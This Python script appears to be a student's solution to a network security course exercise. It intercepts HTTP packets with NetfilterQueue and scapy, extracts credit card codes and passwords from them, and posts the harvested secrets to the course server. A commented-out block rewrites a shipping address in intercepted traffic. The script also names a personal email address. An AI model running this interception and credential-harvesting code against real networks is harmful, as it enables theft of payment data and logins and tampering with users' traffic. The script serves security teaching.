from netfilterqueue import NetfilterQueue
import scapy.all as sp
import inspect as I
import json
import requests
def print_and_accept(pkt):
    print("Got packet")
    payload = pkt.get_payload()
    # print(pkt)
    # print(payload)
    #pkt.drop() to drop a package
    pkt.accept() # let a packet through

def callback(pkt):
    # print("GOT")
    raw_packet = pkt.get_payload()
    getStuff(raw_packet)
    pkt.accept()
keepers = set()
def getStuff(raw_packet): 
    ip_packet = sp.IP(raw_packet)
    if ip_packet.haslayer(sp.TCP):
        tcp_layer = ip_packet[sp.TCP]

        if ip_packet.haslayer(sp.Raw):
            if tcp_layer.dport == 80:
                encoded_payload = ip_packet[sp.Raw]
                # print("Raw: ", type(encoded_payload))
                decoded_payload = encoded_payload.load.decode()
                if "/hw1/ex3/shipping" in decoded_payload:
                    pass
                    # print("decoded_payload")
                else: 
                    # print("GOOD")
                    # print(decoded_payload)
                    contents = decoded_payload.split('"')[1]
                    # print(contents)
                    
                    if "cc --- " in contents:
                        relevant = contents.split("cc --- ")[1][:20]
                        keep= relevant.strip().split()[0]
                        
                        print("CODE:", keep)
                        if  len(min(keep.split("."), key=len)) >= 4:
                            keepers.add(keep.strip())
                        else:
                            print("WRONG CODE", relevant)
                    if "pwd --- " in contents: 
                        relevant = contents.split("pwd --- ")[1]
                        keep = []
                        for ind, el in enumerate(relevant.strip()): 
                            if ind>30: 
                                break
                            if el ==" ":
                                break
                            elif el in ": ; < = > ? @": 
                                keep.append(el)
                            elif el.isupper() or el.isdigit():
                                keep.append(el)
                            else:
                                break
                        result = "".join(keep).strip()
                        if result != "":
                            print("PASSWORD: ", "".join(keep))
                            keepers.add(result)
                            print(keepers)
                    if len(keepers) >= 5: 
                        print( "DONE: ", keepers)
                        out = list(keepers)
                        my_json = { "student_email": "jorn.hofstad@epfl.ch","secrets": list(keepers) }
                        response = requests.post("http://com402.epfl.ch/hw1/ex4/sensitive", json=my_json)
                        print(response)
                        print(response.text)


                    # json_line = [i for i in decoded_payload.split("\n") if "shipping_address" in i]
                    # # print(json_line)
                    # my_json = json.loads(json_line[0])
                    # # print("my json", my_json) 
                    # my_json["shipping_address"]= "jorn.hofstad@epfl.ch"
                    # print("new_json", my_json)
                    # # print(decoded_payload)
                    # headers = {'User-Agent': 'Dumb Generator'}
                    # a = requests.post("http://com402.epfl.ch/hw1/ex3/shipping", json=my_json)
                    # print(a.text) 
                    
            else: 
                print("NOT PORT 80!!!")
                encoded_payload = ip_packet[sp.Raw]
                print("Raw: ", type(encoded_payload))
                decoded_payload = encoded_payload.load.decode()
                print(decoded_payload)
            
            
    else:
        print("Does not have Raw layer")
    # tcp_frame = ip_packet.TCP

    # print(ip_packet[sp.Raw])
print("Start_intercepting")
nfqueue = NetfilterQueue()

#1st arg is ?
#2nd arg is the function that is called for each packet
#3rd arg is 
nfqueue.bind(0, callback,100)
# nfqueue.bind(0, print_and_accept, 100) 
try:
    nfqueue.run()
except KeyboardInterrupt:
    print('')
    print("Keyboard_interrupt")
nfqueue.unbind()



# scapy.sr1 is something ?